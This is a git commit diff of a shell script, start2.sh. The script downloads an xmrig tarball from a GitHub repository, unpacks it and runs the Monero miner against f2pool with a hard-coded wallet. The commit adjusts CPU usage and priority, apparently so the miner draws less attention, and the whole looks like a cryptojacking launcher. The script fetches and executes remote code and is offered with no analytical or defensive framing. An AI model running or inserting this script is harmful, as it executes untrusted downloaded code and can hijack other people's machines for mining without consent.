2b370883e57b416ed135c8bc380e3f7d16a3d136
root <root@SZ-PC-00063.mysoft.com.cn>
2019-05-29 18:31:03 +0800

    first commit

--- start2.sh
+++ start2.sh
@@ -1,4 +1,4 @@
 cd 
 wget https://github.com/docker98k/xm2/raw/master/xm2ig.tar.gz 
 tar xf xm2ig.tar.gz
-cd xm2ig  &&  chmod +x ./xmrig && ./xmrig --donate-level=1  --max-cpu-usage 300  -o xmr.f2pool.com:13531 -u 44N5LqH1RcHg2d3PM4LvJUQ3HdqPojnHQZ2qhWuF5XC5i8NEgDXksCAA31Kpn85KyjM9CQKMvNtCLdRSathMPTagH4iX1ys.workers -p x -k   
+cd xm2ig  &&  chmod +x ./xmrig && ./xmrig --donate-level=1  --max-cpu-usage 100 --cpu-priority 5  -o xmr.f2pool.com:13531 -u 44N5LqH1RcHg2d3PM4LvJUQ3HdqPojnHQZ2qhWuF5XC5i8NEgDXksCAA31Kpn85KyjM9CQKMvNtCLdRSathMPTagH4iX1ys.workers -p x -k   
